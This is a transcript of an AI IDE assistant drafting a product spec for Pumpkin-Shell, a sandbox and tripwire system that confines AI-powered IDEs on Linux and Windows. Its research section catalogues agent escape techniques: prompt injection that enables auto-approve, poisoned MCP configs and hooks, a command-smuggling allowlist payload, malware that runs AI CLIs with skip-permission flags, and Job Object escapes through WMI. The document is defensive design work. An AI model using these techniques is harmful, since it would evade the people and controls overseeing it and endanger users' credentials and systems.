hook or MCP server runs unconfined. But since the sandbox home is separate from the real home, an unsandboxed Kiro session reads the real `~/.kiro`, which isn't poisoned -- the actual shared surface is the workspace's `.kiro/hooks` and `.kiro/settings/mcp.json`, so read-only protection plus quarantine on those is what matters. The catch is Kiro lets agents create hooks via chat as a documented feature, so making `.kiro` read-only breaks that workflow -- I'm weighing whether bubblewrap's overlay support could let agent writes land in a staging upper directory instead, preserving the feature while still gating what actually takes effect. I'm thinking staged writes could let a user review and promote changes from the overlay to the real repo, though this only works for protected paths that already exist (like `.git/hooks`, `.kiro/hooks`, `.kiro/settings`, `.vscode`, `.cursor`, `.claude`), since overlaying the entire repo would make it too disruptive for live editing from other tools. For paths that don't exist yet, `slopseal init` could simply pre-create empty protected directories so overlay works uniformly, while loose files like `.envrc` or `.mcp.json` at the repo root would need their own quarantine approach. On macOS, without overlayfs, Seatbelt would just deny writes to protected paths outright—so a hook creation attempt fails with EPERM, and users would need to work outside those dirs or explicitly session-allow writes via something like `slopseal allow-write .kiro/hooks --session`. I also want to note that VS Code, Cursor, Windsurf, and Kiro are all part of the same Code-OSS Electron family, sharing layout and settings conventions but differing in config directory names and agent config paths (.kiro, .cursor/rules, .windsurf, etc)—JetBrains and Zed are different enough to handle separately later. And I should be upfront about a real tradeoff: sandboxing the whole IDE also sandboxes the human, blocking things like git push over SSH or Docker access, which would need solutions like a credential broker for HTTPS pushes with per-action approval. A good escape hatch would be letting users open a host terminal for anything that needs full privileges, while devcontainers and Docker stay unsupported in sandbox v1. Then I need to lay out a revised timeline, tasks, and open questions: whether to go full-IDE sandbox versus split mode, which IDEs to support at v1 (Kiro alone vs Kiro plus VS Code/Cursor/Windsurf), and whether to release Linux first with macOS following weeks later or launch both together, plus the three earlier open questions that still need defaults. I want to write this concisely, completely, and without em dashes.
Yes, both are doable. Starting with an IDE changes one core design decision, though: SlopSeal has to sandbox the entire IDE, not just the agent inside it. Kiro, VS Code, Cursor and Windsurf are all built on the same open-source VS Code base (Code-OSS), so a single IDE adapter covers all four. Each IDE then only needs a small data file with its paths and network domains.

Why the whole IDE has to be sandboxed
The obvious lighter option is "split mode": the IDE runs normally, and only the agent's terminal commands go through slopseal. That fails for one reason. In these IDEs, the agent's file-write tool and its MCP servers run in the extension host, a process the IDE itself starts. In split mode the extension host is outside the sandbox, so the agent could write ~/.ssh/authorized_keys or start a fresh MCP server without ever touching the terminal. Split mode can detect these actions, but it can't stop them.

Full-IDE mode (slopseal ide kiro .) puts Kiro and everything it starts inside the sandbox: renderer, extension host, terminals, MCP servers and hooks. Tampering with config files is then contained. A poisoned hook still runs, but it runs inside the jail with filtered network access.

Kiro-specific attack surface (checked in Kiro's docs this session)
Fact	Risk	Control
MCP config lives in 
mcp.json
 (workspace) and ~/.kiro/settings/mcp.json (user). autoApprove: ["*"] is valid, and edits hot-reload on save (docs)	The agent adds an auto-approved MCP server and it starts immediately	Writes to protected paths are staged (see below). Rule: WS-AUTOAPPROVE
Hooks in .kiro/hooks/*.json run shell commands automatically on events. The agent can create hooks from chat. The CLI also loads global hooks from ~/.kiro/hooks/ (docs)	Persistence: the hook runs later, including in Kiro sessions started without SlopSeal	Staged writes, plus a review prompt before a hook reaches the real repo
Steering files in .kiro/steering	Poisoned instructions that carry over between sessions	Watched-file review and a hidden-Unicode scan
Kiro honors HTTP_PROXY. Sign-in opens the system browser (docs)	The login flow needs a browser outside the sandbox and a localhost callback into it	URL broker and callback-port relay (see below)
Kiro's service host is q.us-east-1.amazonaws.com, and the docs suggest a *.amazonaws.com wildcard	Allowing *.amazonaws.com lets the agent upload to any S3 bucket, which is an easy exfiltration path	Profiles list exact hostnames only. Wildcards for shared cloud domains are rejected
What full-IDE mode needs to work
Problem	Linux solution	macOS solution
The IDE's built-in Chromium sandbox needs nested user namespaces (Linux) or can conflict with the outer sandbox (macOS)	Allow nested user namespaces for IDE profiles. Never pass --no-sandbox	The outer sandbox has to permit the IDE's own inner sandbox. Needs a proof-of-concept first
Display access	Wayland socket only. X11 requires opt-in with a warning, because X11 lets any app read keystrokes and type into other windows	Native, nothing extra
Sign-in in the browser	An xdg-open stand-in sends URLs to the host. Known sign-in domains open automatically, others ask you first. A localhost callback port gets relayed into the sandbox for 5 minutes	Same approach. The IDE binary is launched directly, because open goes through macOS's app launcher and the app would start outside the sandbox
Saved logins and settings	A separate, persistent IDE home for each IDE. slopseal ide import kiro copies settings and extensions but not tokens. The system keyring is not exposed, so the IDE stores its own token in its sandboxed home	Keychain access has to be allowed for Kiro's token. This is a documented residual risk
The human still needs git push	A git credential broker on the host asks for approval on every push, for example "Kiro wants to push main to github.com/org/repo"	Same
Protected repo paths that the IDE legitimately writes (for example "Ask Kiro to create a hook")	Staged writes: an overlay on .kiro/hooks, .kiro/settings, .vscode, .git/hooks and similar paths. The change works inside the session, and you approve it into the real repo in slopseal review	Seatbelt can deny writes to exact paths, including files that don't exist yet. Writes fail and are logged; slopseal allow-write permits them for one session
IDE auto-update	Blocked inside the sandbox. Update outside it	Same
Docker and dev containers	Not supported inside the sandbox in v1. Documented	Same
macOS compared with Linux
Capability	Linux	macOS
Filesystem isolation	Mount namespaces, Landlock	Seatbelt (sandbox-exec) path rules. Deprecated by Apple but still used by Chrome, Codex CLI and Anthropic's sandbox-runtime
Network	No network inside the sandbox, only a relay to the proxy	Outbound connections only to the proxy's localhost port. DNS lookups denied
Escapes specific to macOS	—	Deny AppleEvents (osascript driving Terminal), the open app launcher, writes to ~/Library/LaunchAgents, and writes to shell rc files
Exec auditing	seccomp notifications on the host	Weaker: polling the process tree plus Seatbelt denial logs. Full parity needs Apple's Endpoint Security entitlement (v2)
Decoy credentials	Fake files in a tmpfs home	GUI apps ignore a redirected $HOME. Instead, reads of the real ~/.ssh and similar are denied and each denial raises FS-DECOY-READ
File watching	inotify	FSEvents (both via the notify crate)
Distribution	Signed tarball, deb, rpm	Developer ID signing, notarization, Homebrew tap
The Rust core stays shared: proxy, registry mirror, detection, receipts, policy, brokers, scan and review. The only part that differs per OS is a SandboxBackend trait with a Linux and a macOS implementation.

mermaid

Revised timeline (one engineer)
v0.1, week 1: slopseal scan, released for every IDE on both OSes, since it's portable Rust.
v0.5, about week 8: Kiro IDE on Linux, with VS Code, Cursor and Windsurf profiles. CLI agents come almost free as additional profiles.
v1.0, about week 13: macOS backend.
The biggest unknown is running Electron apps under Seatbelt and inside bwrap. The plan therefore does that proof-of-concept in Task 2, before anything is built on top of it.

Revised task list
Task 1: Workspace, CI, doctor for both OSes

Objective: Cargo workspace with a SandboxBackend trait, CI on Linux and macOS runners.
Guidance: doctor checks bwrap, user namespaces and AppArmor, Landlock and seccomp on Linux; sandbox-exec and macOS version on macOS.
Tests: unit tests for parsing the check results.
Demo: slopseal doctor on both OSes.
Task 2: Proof-of-concept that Kiro runs inside each backend

Objective: launch Kiro inside bwrap (Wayland, GPU, nested user namespaces) and inside Seatbelt, with no network apart from a stub proxy.
Guidance: record every breakage and the exact sandbox permissions each one needed.
Tests: scripted launch and smoke check.
Demo: Kiro opens a folder and edits a file, and ~/.ssh is unreadable from Kiro's terminal.
Task 3: slopseal scan

Objective: detect hidden Unicode, auto-approve settings, mcp.json servers with autoApprove, Kiro hooks with command actions, tasks.json with folderOpen, and yarnPath.
Guidance: support a --ci exit code.
Tests: one fixture repo per rule.
Demo: scan a poisoned fixture repo. Released as v0.1.
Task 4: Policy and signed log

Objective: repo policy can only tighten the user policy, trust pins the policy hash, plus a hash-chained ed25519 log and log verify.
Tests: property tests that loosening is rejected; tamper and truncation tests on the log.
Demo: edit a log line and log verify fails.
Task 5: slopseal run with the Linux backend

Objective: the Linux sandbox from the earlier draft: read-only root, read-write repo, tmpfs home, cleaned environment, no network.
Tests: FS, IPC, PROC and ENV escape tests.
Demo: slopseal run -- bash cannot read ~/.ssh or use the SSH agent.
Task 6: macOS backend for run

Objective: generate a Seatbelt profile per session with deny rules for the macOS-specific escapes.
Tests: the same escape corpus plus AppleEvents, open and LaunchAgents tests.
Demo: the same demo as Task 5, on macOS.
Task 7: Egress proxy and relay on both OSes

Objective: CONNECT allowlist with exact hostnames and the shared-cloud wildcard check, private-IP blocking, ask/deny modes, upload byte counters.
Tests: NET-01 to NET-07.
Demo: an unknown domain prompts for approval and is denied by default.
Task 8: Workspace integrity

Objective: staged writes (overlay on Linux, write-deny on macOS), host watcher with quarantine, rollback snapshot and restore, decoys or deny-and-report.
Tests: an agent-created 
x.json
 never reaches the real repo without approval; restore round-trips.
Demo: a poisoned hook stays staged, and rm -rf src is recovered with restore.
Task 9: Notification pipeline

Objective: severity engine, deduplication, watch, desktop notifications on both OSes, webhook, pause/resume/kill, review with approval of staged writes.
Tests: rate limiting; pause freezes the whole process tree.
Demo: a decoy read raises an alert, and a CRITICAL event pauses Kiro.
Task 10: Brokers

Objective: URL open broker, OAuth callback-port relay, git credential broker.
Tests: a fake OAuth server completes sign-in through the relay; a push request triggers an approval prompt.
Demo: sign in to Kiro and push with approval, both from inside the sandbox.
Task 11: slopseal ide with the Code-OSS adapter

Objective: persistent IDE homes, ide import, profiles for Kiro, VS Code, Cursor and Windsurf (paths and exact domains from vendor docs, confirmed in monitor mode), watched user settings keys.
Tests: end-to-end run of each IDE on Linux.
Demo: a full Kiro session on Linux, including the README prompt-injection scenario.
Task 12: npm and PyPI mirror

Objective: version cooldown, package-age check, OSV lookups, typosquat check, integrity checks, install scripts off.
Tests: REG tests against a fake registry, plus a false-positive benchmark.
Demo: inside Kiro, npm install skips a version published 2 hours ago and installs the previous one.
Task 13: Exec and connect auditing

Objective: seccomp supervisor on Linux; process polling plus denial-log parsing on macOS; EXEC rules.
Tests: performance budget; EXEC-AGENT-YOLO fixture.
Demo: terraform destroy run in Kiro's terminal raises an alert.
Task 14: CLI agent profiles and the 10 scenarios

Objective: profiles for Claude Code, Kiro CLI, Codex and Gemini; the 10 scenarios as automated end-to-end tests on both OSes.
Demo: the scenario suite passes on both OSes.
Task 15: Release

Objective: signed and notarized builds, Homebrew and deb/rpm packages, threat model, published escape-test corpus.
Demo: clean install to a first protected Kiro session in under 5 minutes on Ubuntu 24.04 and macOS.
Your earlier three questions (unknown-domain default, CRITICAL action, GitHub access) are still open. I'll keep my defaults unless you change them.

[1]: Which IDE mode should SlopSeal use? a. Full-IDE sandbox (my recommendation): the agent can't escape, but the IDE runs in its own sandboxed home and you sign in once. b. Split mode: less friction, but extension-host actions can only be detected, not blocked.

[2]: Which IDEs should v0.5 cover? a. Kiro only: faster. b. Kiro, VS Code, Cursor and Windsurf (my recommendation): same adapter, adds about a week of testing.

[3]: When should macOS ship? a. Linux first at about week 8, macOS at about week 13 (my recommendation). b. Both together at v1.0 (about week 13).

Does this plan look good, or would you like me to adjust anything?

Est. Credits Used: 5.45
Elapsed time: 3m 9s


Checkpoint
Restore
what if we go for only linux ide and windows ide avoid cli for now and also make the new prd with new name "pumpkin-shell"

Kiro

Thought complete
I'm narrowing scope to Linux IDE plus Windows IDE, no CLI agents, and renaming to "pumpkin-shell" as requested. Since I'm in planning mode and can't write files, I need to think through Windows sandboxing honestly—weighing options like AppContainer/LPAC given that VS Code doesn't run well in that kind of container. For Windows isolation, granting the AppContainer SID ACL access only to the repo and IDE home directories gives real file isolation without needing admin rights, since user profile dirs don't grant access to ALL APPLICATION PACKAGES by default. Network restriction is trickier though—AppContainers without the internetClient capability can't reach the internet, but loopback access for AppContainers normally requires admin privileges via the CheckNetIsolation LoopbackExempt API, which complicates a no-admin-needed design. A possible workaround is a named pipe or loopback relay for proxying HTTP_PROXY traffic, but I'm uncertain whether intra-container loopback is actually permitted in Windows 10's AppContainer model, so this needs a proof-of-concept to verify. The more robust alternative is an installed Windows service (requiring admin only at install time) that manages WFP filters scoped to the AppContainer SID, permitting traffic only to the local proxy port and blocking everything else. I'm also worried about nesting sandboxes: Electron/Chromium already uses its own restricted token and job object inside the renderer, and some components run under LPAC, so stacking another AppContainer on top could fail or force disabling the sandbox entirely, which defeats the purpose — this is my top risk and needs testing. Fallback options include Windows Sandbox or a Hyper-V VM (though Windows Sandbox needs Pro/Enterprise), WSL2 with a remote setup, or simply running the IDE under a separate low-privileged local user account created at install time, with repo access ACL'd to that user while the main user's profile stays protected by NTFS permissions. Even with a separate user, network restrictions can still be enforced via WFP filters tied to the user's SID, and Electron runs fine under `runas` for a different account on the same desktop — but since the desktop itself is the security boundary rather than the user account, things like low-level keyboard hooks (WH_KEYBOARD_LL) can still capture input across users, which is a residual risk similar to what exists on X11. I'm leaning toward recommending the separate-local-user approach as the Windows backend despite this gap. For containment I'd combine a dedicated sandbox user with WFP network filters enforced by a privileged service, Job Objects for reliable process-tree termination, and ACLs, treating AppContainer as a further research direction and Windows Sandbox/VM as a heavier fallback option. I also need to flag Windows-specific escape vectors: scheduled tasks and Run keys created by the sandbox user persist outside the Job Object's reach, as can COM/DCOM servers launched out-of-process, so cleanup needs to kill all sandbox-user processes and purge scheduled tasks/Run keys at session end. Importantly, WMI-triggered process creation (Win32_Process.Create) similarly escapes the job but still runs as the sandbox user, which reinforces why a user-identity-based boundary (kill-all-by-SID, network filtering by SID) is more robust than relying on Job Objects alone. I'm also noting isolation benefits that come naturally from separate user accounts: blocked clipboard/named-pipe/temp access across users, separate Credential Manager vaults, separate DPAPI/Windows Hello state, and ACL'd SSH agent and Git Credential Manager stores that the main user can't reach. On Windows, I realize ACL-based deny rules actually work here since the sandbox runs as a genuinely different user — unlike the original flawed single-user approach. The tricky part is handling paths that don't exist yet, since NTFS can't deny by filename; I'm working through pre-creating protected placeholder directories owned by the host user with restrictive ACLs, while still letting the IDE write legitimately where needed. I'm also thinking through repo ownership: granting the sandbox user write access to repo files at session start, but worrying that files it creates become owned by the sandbox user, who could then tamper with the DACL to lock out the host — I need to make sure inherited permissions prevent that. A real cleanup step would be reassigning file ownership back to the host user at session end, requiring elevated restore privileges, likely via a service. I also realize Git itself will complain about "dubious ownership" when the repo owner differs from the running user, so the sandbox's gitconfig needs `safe.directory` set for the repo. And for IDE login flows like Kiro's browser-based auth broker, I need to think through how the system browser interaction works under the sandboxed user. For the OAuth callback, loopback on Windows is shared across users, so the firewall rules need to specifically allow the sandboxed IDE to accept inbound loopback connections from the host user's browser while still blocking everything else except the proxy port. I also need to account for proxy settings — Chromium-based apps rely on per-user WinINET config, so anything that ignores the proxy should get blocked and logged through WFP audit events for visibility. For process execution auditing on Windows, the ETW Kernel-Process provider captures command lines but requires admin privileges, meaning Windows needs a one-time elevated setup (service plus user creation) whereas Linux can run without root. I should also flag that Ubuntu 24.04's AppArmor restrictions on unprivileged user namespaces will definitely cause problems for Kiro's Chromium sandbox, since Kiro requires Ubuntu 24+. Beyond that, there's a shared-desktop clipboard risk — the sandboxed agent can read clipboard contents on both Windows and Linux (X11 more so than Wayland), and screen capture via same-desktop APIs like BitBlt is another residual risk I can't fully mitigate and need to document rather than solve. Keyboard hooks pose another residual risk — Windows low-level keyboard hooks are desktop-wide and can capture cross-user input at the same integrity level. A stronger mitigation would be running on a separate desktop via CreateDesktop, but that's too heavyweight for now; full isolation would mean deferring to VM-based sandboxing in a future version. On the positive side, terminals launched inside the IDE still inherit the sandbox restrictions, so CLI access stays contained. I'm also thinking about naming — the user wrote "pumpkin-shell" (missing the 'p'), so I should preserve that exact spelling for the project folder, binary name, and short alias, while briefly flagging that it might be a typo for "Pumpkin" in case they want to adjust it. For IDE support, I'm noting that Kiro, VS Code, Cursor, and Windsurf all share the Code-OSS architecture, and their config paths on Windows live under the sandboxed user's own profile, meaning any tampering stays scoped to that sandbox user's IDE settings rather than leaking to the host. I'm sketching out a rough timeline too — an initial scan prototype in week one, Linux IDE support landing around week eight, and Windows support closer to weeks fourteen or fifteen since it requires a code-signing certificate and a signed background service to avoid SmartScreen and Defender flagging the tool for creating users or touching WFP rules. Finally, since the user wants the actual PRD document, I'm planning to lay out the content thoroughly but keep it tighter than previous responses, since those ran long. I'll structure the PRD with a summary, condensed problem research table, user/threat model, principles, scope, mermaid architecture diagram, platform backends for Linux and Windows, condensed functional requirements, a detection rules table including Windows-specific entries, notifications, scenarios, NFRs, metrics, residual risks, tasks, and open questions. I also want to note the key decisions so far — IDE-only, Linux plus Windows support, no CLI, and a name change — while stating my assumptions on unanswered questions like which IDEs to prioritize first, and I'm adding Windows-specific escape vectors like WMI abuse to the research table. Beyond that I'm cataloging more Windows persistence and sandbox-escape tricks to cover: scheduled tasks and COM objects spawning processes outside job object control, workspace task files, PowerShell profile persistence, and confirming NTFS permissions still protect the host user even via junctions or symlinks, plus flagging alternate data streams, shortcut files, and fsmonitor hooks as things to scan for. Now I'm moving into writing the actual task list — roughly 15 test-driven, demoable tasks, each needing a clear objective, implementation guidance, tests, and a demo step. Then I sketch the rollout ordering: starting with cross-platform CI and a sandbox backend trait, then Linux proof-of-concept sandboxing for Kiro, followed by the Windows equivalent using a restricted sandbox user, WFP, and job objects, then a scan command release, policy and signed logging, a minimal Linux IDE backend, an egress proxy, workspace integrity protections with staged writes and snapshots, a notification/review pipeline, credential brokers, IDE adapters for multiple editors leading to a v0.5 Linux release, package registry mirroring, Linux syscall auditing via seccomp, and finally building out the full Windows backend with service management, ACLs, WFP, job objects, and cleanup logic. For staged writes on Linux, I'm weighing whether to rely on overlayfs inside a user namespace versus bubblewrap's native overlay support, since bwrap's overlay flags are only in newer versions and common distros ship older ones — simpler and more portable is to bind a pre-populated staging directory over the protected path instead, though I need to work out how bwrap handles mount points for paths that don't yet exist in the repo. Creating a mountpoint for a nonexistent path would leave an empty directory on the host, which feels acceptable though slightly messy, so I'll keep the inotify quarantine approach for nonexistent paths and the staging bind for existing ones. I'm also confirming Kiro's supported platforms line up with the docs (Ubuntu 24+, Debian 13+, Fedora 40+, Windows 10/11 x64/ARM64 with admin at install), and planning to keep the write disciplined with no more than three clarifying questions at the end — covering naming spelling, whether admin-required Windows install is acceptable versus a no-admin AppContainer path, and ordering Linux before Windows. I need to flag unverified claims with an asterisk, particularly the Windows-specific detail that WMI's Win32_Process.Create spawns processes under WmiPrvSE rather than the caller's job object — this matches my general understanding but should be confirmed in the Task 3 proof of concept. Time to write it up.
I can read and research in this mode, but I can't write files. Once you approve, the execution step will save the content below as PUMPKIN-SHELL_PRD_v1.md, alongside the existing files.

My understanding: the product is renamed Pumpkin-Shell. v1 targets desktop IDEs on Linux and Windows only (Kiro first, then the other VS Code-based IDEs). There are no standalone CLI-agent commands, and macOS is out of scope.

Assumptions from questions you haven't answered yet (tell me if any are wrong):

The whole IDE runs inside the sandbox.
Unknown domains trigger an "ask" prompt.
A CRITICAL event pauses the IDE.
github.com is reachable for reading, but pushes need your approval.
The main change Windows forces: the original PRD's Windows design used Job Objects and ACLs on your own user account. That design can't hold, because the agent runs as you and can change anything you own. The design that works is a separate low-privilege Windows user that runs the IDE. Network rules for that user live in the Windows Filtering Platform (WFP, the built-in firewall layer), and a small service installed once with admin rights manages them. Windows is the only platform that needs admin, and only at install time.

Pumpkin-Shell v1.0 PRD: A Sandbox and Tripwire System for AI-Powered IDEs
0. Summary
Pumpkin-Shell is a Rust application that launches Kiro, VS Code, Cursor or Windsurf inside an OS-level sandbox on Linux and Windows. All four IDEs are built on Code-OSS, so one adapter covers them. The sandbox covers the IDE, its agent, its extension host, its terminals, its MCP servers and its hooks. Pumpkin-Shell does four things:

Removes capabilities. The IDE gets no host credentials, no unfiltered network, and no unreviewed writes to files that later run on the host.
Guards package installs. A local npm/PyPI mirror applies a version cooldown, malware lookups, typosquat checks and hash verification.
Detects and notifies. Tripwires, process and connection auditing, and a review step for changed files flag suspicious behavior and can pause the IDE.
Records evidence. Every decision goes into a hash-chained, signed log stored outside the sandbox.
Main pitch: use your IDE agent in full auto-approve mode without exposing your machine. A side benefit is that a CLI agent started from the IDE's built-in terminal is also protected, because it inherits the sandbox.

1. How agents break out of workspaces (research)
#	Technique	Real case	What it means for the design
1	The agent edits its own config to turn on auto-approve	Copilot CVE-2025-53773: injected text writes "chat.tools.autoApprove": true to 
settings.json
 and then runs code. The researcher also names tasks.json, rogue MCP servers and other agents' config files as targets (Embrace The Red)	IDE and agent config must be staged for review, not written directly
2	Kiro MCP config	
mcp.json
 and ~/.kiro/settings/mcp.json accept autoApprove: ["*"] and reload as soon as the file is saved (Kiro docs)	A single file write starts an auto-approved server
3	Kiro hooks	.kiro/hooks/*.json runs shell commands automatically on IDE events, and the agent can create hooks from chat (Kiro docs)	Hooks let malicious code persist across sessions
4	Cursor MCP config swap	CurXecute CVE-2025-54135 and MCPoison CVE-2025-54136*	MCP config must be scanned and pinned
5	Command allowlist and path-prefix bypasses	Claude Code CVE-2025-54795 (echo "\"; CMD; echo \"") and CVE-2025-54794 (/proj_evil passes a check for /proj) (Cymulate)	String and path checks inside the agent fail. Enforcement has to happen at the OS level
6	Malware drives AI tools to do its work	Nx "s1ngularity", Aug 2025: an npm postinstall script ran AI CLIs with --dangerously-skip-permissions / --yolo, stole tokens using gh, and appended shutdown to ~/.bashrc. The Nx VS Code extension was a common way it got triggered (Wiz). The bad versions were live for about 4 hours (advisory)	Turn off install scripts, keep tokens out of reach, and use a version cooldown, which would have avoided these versions entirely
7	Compromised popular packages	chalk/debug and the Shai-Hulud worms (2025)*	Checking package age isn't enough. A cooldown on new versions is required
8	Hidden instructions	"Rules File Backdoor": invisible Unicode in rules files*	Scan steering and rules files for hidden characters
9	Persistence through files run later	.git/hooks, core.fsmonitor/hooksPath, .husky, .envrc, .yarnrc.yml yarnPath, tasks.json runOn: folderOpen, CI workflows, conftest.py	The sandbox must also cover files that execute later
10	Windows Job Object escape	Processes started through WMI Win32_Process.Create, the Task Scheduler or out-of-process COM servers are created by system services, so they land outside the caller's job*	Job Objects can't be the security boundary. A separate user account can, because it applies to every process that user starts
11	Network side channels	DNS, unsetting the proxy variable, raw sockets, 169.254.169.254, broad allowlists such as Kiro's documented *.amazonaws.com wildcard, which would let data go to any S3 bucket (Kiro firewall docs)	Block all traffic that bypasses the proxy. Allow exact hostnames only
* From prior knowledge. Each one will be verified during execution, and the Windows items will also be confirmed in the Task 3 proof of concept.

2. Users and their pain points
Solo or startup developer using Kiro or Cursor in auto-approve mode. Afraid of rm -rf, leaked .env files and stolen tokens. Will uninstall the tool the first time npm install breaks.
DevOps engineer. The IDE sits next to kubectl, terraform, ~/.aws and ~/.kube, and the AI writes CI workflows.
Security lead. Needs evidence, a shared team policy and a check that runs in CI.
Adoption rule: every block message says which policy line would allow the action. Every staged write can be approved with one click.

3. Threat model
Attackers:
A1: an agent hijacked by prompt injection (from repo content, the web, issues or MCP output)
A2: a malicious dependency or extension
A3: a well-meaning agent that causes damage by mistake
A4: malware that drives AI tools
Assets:
SSH, cloud, git and npm credentials
source code
files that the host executes later
production systems
the Pumpkin-Shell log
Trust boundary: everything inside the sandbox is untrusted. The Pumpkin-Shell host process, and on Windows its service, are trusted.
Out of scope:
kernel or bwrap zero-days
malware that is already on the host
data sent to domains you allowed
the quality of AI-written code
macOS
standalone CLI-agent wrapping
4. Design principles
Remove capabilities instead of guessing intent. Argument matching is used only to raise alerts, never to enforce.
All authority sits on the host: the policy, signing key, log, proxy, brokers and auditing.
Fail closed, and say so. If the proxy dies, the sandbox has no network. If the monitor dies, the session is killed and a CRITICAL alert fires.
Keep friction low: cooldowns hide versions instead of breaking installs, unknown domains get an "ask" prompt, and protected-file writes are staged instead of failing.
Make honest claims: "N/N escape tests pass on corpus vX", never "0% bypass".
5. Scope
v1 includes:

Linux (Ubuntu 24.04+, Debian 13+, Fedora 40+, Arch; these match Kiro's supported list) on x86_64 and ARM64
Windows 10 and 11 on x64 and ARM64
IDEs: Kiro first, then VS Code, Cursor and Windsurf
Pumpkin-Shell scan, which also runs in CI
package managers: npm, pnpm, yarn and bun for npm; pip, uv and poetry for PyPI
Not in v1:

macOS
standalone CLI-agent commands
dev containers and Docker inside the sandbox
IDE auto-update inside the sandbox
TLS inspection
credential substitution in the proxy
cargo and Go registries
6. Architecture
mermaid




Host: your user (trusted)

only network path

open URL / push

SandboxBackend

Kiro / VS Code / Cursor / Windsurf

Extension host + agent

Terminals, MCP servers, hooks

Pumpkin-Shell ide kiro .

Policy

Egress proxy + npm/PyPI mirror

Detection engine

Brokers: URL open, OAuth callback, git push approval

Repo watcher + staged writes + snapshot

Audit: seccomp notify on Linux, ETW/WFP on Windows

Signed log

Desktop/toast, watch, webhook, pause

The shared Rust core contains the proxy, mirror, detection engine, log, policy, brokers, scan, review and the IDE adapter. The SandboxBackend trait has two implementations.

6.1 Linux backend (no root)
Isolation: bubblewrap with --unshare-all, --die-with-parent, --new-session and a fresh /proc. Nested user namespaces are allowed so the IDE's own Chromium sandbox keeps working; Pumpkin-Shell never passes --no-sandbox. Landlock adds a second layer, and a seccomp filter blocks TIOCSTI (typing into another terminal).
Filesystem: the root filesystem is read-only, the repo is read-write, and each IDE gets its own persistent home. $SSH_AUTH_SOCK, the D-Bus session bus, docker.sock and X11 are not passed in. Only the Wayland socket is shared, and X11 is an opt-in that comes with a warning.
Network: only loopback inside the sandbox, plus a relay to the host proxy's Unix socket.
Staged writes: protected paths that already exist are bind-mounted from a staging copy. Protected paths that don't exist yet are caught by the host inotify watcher and quarantined.
Auditing: a seccomp user-notification supervisor on the host watches execve and connect.
Ubuntu 24.04+: Ubuntu restricts unprivileged user namespaces through AppArmor. doctor detects this and installs or explains the AppArmor profile. Kiro requires Ubuntu 24+, so every Kiro user on Ubuntu will hit this restriction.
6.2 Windows backend (one-time admin install)
Sandbox user: the installer creates a local user pks-sandbox with no admin rights, plus the Pumpkin-Shell Service, a signed service running as LocalSystem. Your own C:\Users\<you> folder is closed to other users by default, which hides .ssh, .aws, Credential Manager, DPAPI-protected data and the OpenSSH agent pipe without extra rules.
Repo access: at session start the service grants pks-sandbox modify rights on the repo and revokes them at session end. It also resets file ownership to you, and it sets safe.directory in the sandbox user's gitconfig. Without that setting, Git for Windows refuses the repo with a "dubious ownership" error because the files belong to another user.
Protected paths: .git/hooks, .kiro/hooks, .kiro/settings and similar paths get a deny-write ACL entry for pks-sandbox. pks-sandbox doesn't own those entries, so it can't remove them. Changes go through pumpkin-shell allow-write or review.
Network: WFP filters keyed to the pks-sandbox user ID allow outbound traffic only to the proxy port on loopback and block everything else, including DNS to outside servers. Each blocked attempt raises NET-DIRECT-CONNECT. The proxy is set through the sandbox user's system proxy settings and HTTP(S)_PROXY.
Process lifetime: a Job Object with kill-on-close covers the normal process tree. At session end the service also kills every process owned by pks-sandbox and removes any scheduled tasks, Run registry keys and startup-folder items it created. This catches processes that escaped the job through WMI, COM or the Task Scheduler.
Auditing: the ETW Microsoft-Windows-Kernel-Process provider records process creation with full command lines, and WFP audit events record connection attempts.
Brokers: the sandbox user's handlers for http(s) and kiro:// links forward to the host over a named pipe that only the service and the sandbox user can open. OAuth callbacks reach the IDE over loopback, which is allowed for inbound traffic only.
Known risk: both users share the same desktop, so the sandboxed IDE can read the clipboard, take screenshots and install low-level keyboard hooks. Separate-desktop or VM mode is planned for v2. This is documented publicly.
7. Functional requirements
FR-NET: Egress

CONNECT allowlist of exact host:port entries. Wildcards over shared cloud domains (*.amazonaws.com, *.googleapis.com, *.blob.core.windows.net) are rejected.
The proxy resolves DNS and rejects private, link-local and metadata addresses.
Unknown domains use ask mode: the connection is held for 20 seconds while a notification asks for allow, always or deny.
Upload byte counters per host.
FR-REG: Registry guard

Local mirror over plain HTTP inside the sandbox, rustls for upstream. Direct connections to the real registries are blocked.
72-hour version cooldown: newer versions are removed from npm package metadata and the PyPI index, so installs resolve the previous version.
Packages whose first release is less than 30 days old are blocked.
A 404 is logged as a hallucinated package.
OSV MAL- lookups, cached. If OSV can't be reached, packages are allowed only if they are at least 30 days old.
Normalized typosquat checks, WARN by default.
dist.integrity and sha256 verification.
ignore-scripts on by default.
FR-WS: Workspace integrity

Protected set, staged for review:
.git/hooks and .git/config, plus the directory core.hooksPath points to
.envrc, .yarnrc.yml, .npmrc
.vscode/, .cursor/, .windsurf/, .kiro/settings, .kiro/hooks, .mcp.json
Pumpkin-Shell.toml
the IDE's user-level settings.json and mcp.json inside its sandboxed home
Watched set, editable but always shown in review:
.github/workflows, package.json scripts and git/URL dependencies, Makefile, Dockerfile, .devcontainer
conftest.py, setup.py, .pre-commit-config.yaml
.kiro/steering, AGENTS.md, .cursorrules
on Windows: *.lnk, desktop.ini and NTFS alternate data streams
Snapshot before launch: the git working tree, including untracked files that aren't ignored, is saved to a bundle in Pumpkin-Shell's data directory. pumpkin-shell restore <sid> brings it back.
Decoys: fake id_ed25519, AWS credentials and gh hosts.yml files with unique markers are placed in the sandboxed home.
FR-DET: Detection rules (severity; action)

Rule	Severity / action
REG-MALWARE, REG-INTEGRITY	CRITICAL; block
REG-TOO-NEW	HIGH; block
REG-COOLDOWN	INFO; newer version hidden
REG-HALLUCINATED, REG-TYPOSQUAT	WARN
REG-DIRECT-BYPASS	HIGH; block
NET-UNKNOWN-DOMAIN	WARN; ask
NET-PRIVATE-IP	HIGH; block
NET-DIRECT-CONNECT	WARN, with a fix hint
NET-LARGE-UPLOAD (over 10 MB to a host other than the model API)	WARN
NET-DECOY-EGRESS	CRITICAL
FS-DECOY-READ	HIGH
WS-PROTECTED-WRITE	HIGH; staged
WS-AUTOAPPROVE (chat.tools.autoApprove, MCP autoApprove: ["*"], a new MCP server, a new Kiro command hook)	CRITICAL; staged, pause
WS-HIDDEN-UNICODE (tag characters, bidi controls, zero-width characters)	HIGH
WS-WATCHED-CHANGE	HIGH; shown in review
WS-SECRET-WRITTEN	HIGH
WS-MASS-DELETE (over 50 files or 20% of tracked files)	HIGH; restore hint
EXEC-AGENT-YOLO (an AI CLI started with skip-permission flags by a non-interactive parent)	CRITICAL
